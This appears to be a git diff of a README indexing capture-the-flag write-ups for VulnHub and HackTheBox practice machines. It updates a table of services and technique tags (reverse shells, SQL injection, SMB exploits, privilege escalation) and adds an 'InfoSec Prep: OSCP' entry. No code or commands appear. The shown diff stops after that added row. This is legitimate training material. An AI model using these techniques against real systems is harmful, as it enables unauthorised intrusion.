@@ -115,7 +115,7 @@
 | 4. | `25/tcp` |  | [`enumerate_proto_smtp`](https://github.com/7h3rAm/writeups#enumerate_proto_smtp) |  |
 | 5. | `53/tcp` |  | [`enumerate_proto_dns`](https://github.com/7h3rAm/writeups#enumerate_proto_dns) |  |
 | 6. | `79/tcp` |  | [`enumerate_proto_finger`](https://github.com/7h3rAm/writeups#enumerate_proto_finger) |  |
-| 7. | `80/tcp` | `http/2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd`<br /><br />`http/Apache httpd 2.0.52 ((CentOS))`<br /><br />`http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)`<br /><br />`http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)`<br /><br />`http/Apache httpd 2.2.22 ((Ubuntu))`<br /><br />`http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)`<br /><br />`http/Apache httpd 2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.25 ((Debian))`<br /><br />`http/Apache httpd 2.4.29 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.34 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.7 ((Ubuntu))`<br /><br />`http/HttpFileServer httpd 2.3`<br /><br />`http/Microsoft IIS httpd 6.0`<br /><br />`http/Microsoft IIS httpd 7.5` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) |
+| 7. | `80/tcp` | `http/2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd`<br /><br />`http/Apache httpd 2.0.52 ((CentOS))`<br /><br />`http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)`<br /><br />`http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)`<br /><br />`http/Apache httpd 2.2.22 ((Ubuntu))`<br /><br />`http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)`<br /><br />`http/Apache httpd 2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.25 ((Debian))`<br /><br />`http/Apache httpd 2.4.29 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.34 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.41 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.7 ((Ubuntu))`<br /><br />`http/HttpFileServer httpd 2.3`<br /><br />`http/Microsoft IIS httpd 6.0`<br /><br />`http/Microsoft IIS httpd 7.5` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) |
 | 8. | `111/tcp` |  | [`enumerate_proto_nfs`](https://github.com/7h3rAm/writeups#enumerate_proto_nfs), [`enumerate_proto_rpc`](https://github.com/7h3rAm/writeups#enumerate_proto_rpc) |  |
 | 9. | `135/tcp` |  | [`enumerate_proto_rpc`](https://github.com/7h3rAm/writeups#enumerate_proto_rpc) |  |
 | 10. | `139/tcp` | `netbios-ssn/Microsoft Windows netbios-ssn`<br /><br />`netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)` | [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067), [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010) | [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067), [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_usermap`](https://github.com/7h3rAm/writeups#exploit_smb_usermap), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root) |
@@ -174,23 +174,24 @@
 | 17. |                                                                                                          [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf)                                                                                                          |          [vh#48](https://www.vulnhub.com/entry/hacklab-vulnix,48/)          |           <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100"/>            |                                                                                                                                                                                                                [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys)                                                                                                                                                                                                               |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
 | 18. |                                                                                                             [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf)                                                                                                             |            [vh#330](https://www.vulnhub.com/entry/hackme-1,330/)            |           <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100"/>            |                                                                                                                                                                                                                                                                   [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid)                                                                                                                                                                                                                                                                   |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
 | 19. |                                                                                                                [IMF: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf)                                                                                                                |              [vh#162](https://www.vulnhub.com/entry/imf-1,162/)             |             <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/killchain.png" width="100" height="100"/>             |                                                                                                                                                                                                                                                                                                             [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof)                                                                                                                                                                                                                                                                                                            |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 20. |                                                                                                      [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf)                                                                                                       |          [vh#62](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)         |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                                    [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd)                                                                                                                                                                                                                                                                                    |   [`👹`](foo "BSD")   |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 21. |                                                                                                     [Kioptrix: Level 1 (#1)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf)                                                                                                     |        [vh#22](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)        |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                                                                         [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl)                                                                                                                                                                                                                                                                                                                        |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 22. |                                                                                                    [Kioptrix: Level 1.1 (#2)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf)                                                                                                    |        [vh#23](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)       |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                             [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend)                                                                                                                                                                                                                                                                             |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 23. |                                                                                                    [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf)                                                                                                    |        [vh#24](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)       |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                                                                                                                    [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo)                                                                                                                                                                                                                                                                                    |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 24. |                                                                                                    [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf)                                                                                                    |        [vh#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)       |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100"/>          |                                                                                                                                                                                               [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf)                                                                                                                                                                                               |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 25. |       [Lame](https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/ratings.png" width="59" height="20"/>       |          [htb#1](https://www.hackthebox.eu/home/machines/profile/1)         |              <img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/killchain.png" width="100" height="100"/>               |                                                                                                                                                                                                                                                                                                                                                       [`exploit_smb_usermap`](https://github.com/7h3rAm/writeups#exploit_smb_usermap)                                                                                                                                                                                                                                                                                                                                                       |  [`🐧`](foo "Linux")  | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 26. |                                                                                                      [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf)                                                                                                       |         [vh#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/)         |        <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100"/>        |                                                                                       [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo)                                                                                       |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 27. |   [Legacy](https://github.com/7h3rAm/writeups/blob/master/htb.legacy/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/ratings.png" width="59" height="20"/>   |          [htb#2](https://www.hackthebox.eu/home/machines/profile/2)         |             <img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/killchain.png" width="100" height="100"/>              |                                                                                                                                                                                                                                                                                                                                                      [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067)                                                                                                                                                                                                                                                                                                                                                      | [`🔷`](foo "Windows") | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 28. |                                                                                                       [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf)                                                                                                       |          [vh#244](https://www.vulnhub.com/entry/linsecurity-1,244/)         |        <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100"/>         |                                                                                                                                                                                                                         [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group)                                                                                                                                                                                                                        |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 29. |                                                                                                 [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf)                                                                                                 |      [vh#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)      |      <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100"/>       |                                                                                                                                                                                           [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf)                                                                                                                                                                                           |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 30. |     [Mirai](https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/ratings.png" width="59" height="20"/>     |         [htb#64](https://www.hackthebox.eu/home/machines/profile/64)        |              <img src="https://github.com/7h3rAm/writeups/blob/master/htb.mirai/killchain.png" width="100" height="100"/>              |                                                                                                                                                                                                                                                                                                                  [`exploit_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_defaultcreds), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers)                                                                                                                                                                                                                                                                                                                 |  [`🐧`](foo "Linux")  | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 31. |                                                                                                      [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf)                                                                                                       |         [vh#371](https://www.vulnhub.com/entry/misdirection-1,371/)         |        <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100"/>        |                                                                                                                                                                                                                       [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable)                                                                                                                                                                                                                      |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 32. |                                                                                                            [Moria: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/writeup.pdf)                                                                                                            |            [vh#187](https://www.vulnhub.com/entry/moria-11,187/)            |           <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/killchain.png" width="100" height="100"/>           |                                                                                                                                                                                                                                                                                                                                                    [`privesc_ssh_knownhosts`](https://github.com/7h3rAm/writeups#privesc_ssh_knownhosts)                                                                                                                                                                                                                                                                                                                                                    |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") |                           |
-| 33. |                                                                                                           [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf)                                                                                                           |           [vh#151](https://www.vulnhub.com/entry/mr-robot-1,151/)           |          <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100"/>           |                                                                                                                                                                                                                                                                             [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap)                                                                                                                                                                                                                                                                             |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 34. |                                                                                                              [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf)                                                                                                               |             [vh#252](https://www.vulnhub.com/entry/node-1,252/)             |            <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100"/>            |                                                                                                                                                                                                                                             [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid)                                                                                                                                                                                                                                            |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 35. | [Optimum](https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/ratings.png" width="59" height="20"/> |          [htb#6](https://www.hackthebox.eu/home/machines/profile/6)         |             <img src="https://github.com/7h3rAm/writeups/blob/master/htb.optimum/killchain.png" width="100" height="100"/>             |                                                                                                                                                                                                                                                                                                         [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098)                                                                                                                                                                                                                                                                                                        | [`🔷`](foo "Windows") | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
-| 36. | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf)<br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/matrix.png" width="59" height="59"/><br/><img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/ratings.png" width="59" height="20"/> |        [htb#108](https://www.hackthebox.eu/home/machines/profile/108)       |             <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100"/>             |                                                                                                                                                                                                                                                                                                                    [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers)                                                                                                                                                                                                                                                                                                                   |  [`🐧`](foo "Linux")  | [`🟢`](foo "20pts") | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
+| 20. |                                                                                                    [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf)                                                                                                    |        [vh#508](https://www.vulnhub.com/entry/infosec-prep-oscp,508/)       |       <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100"/>       |                                                                                                                                                                                                                                                                    [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash)                                                                                                                                                                                                                                                                    |  [`🐧`](foo "Linux")  |                    | [`🩸`](foo "access_root") | [`⚠️`](foo "== oscplike") |
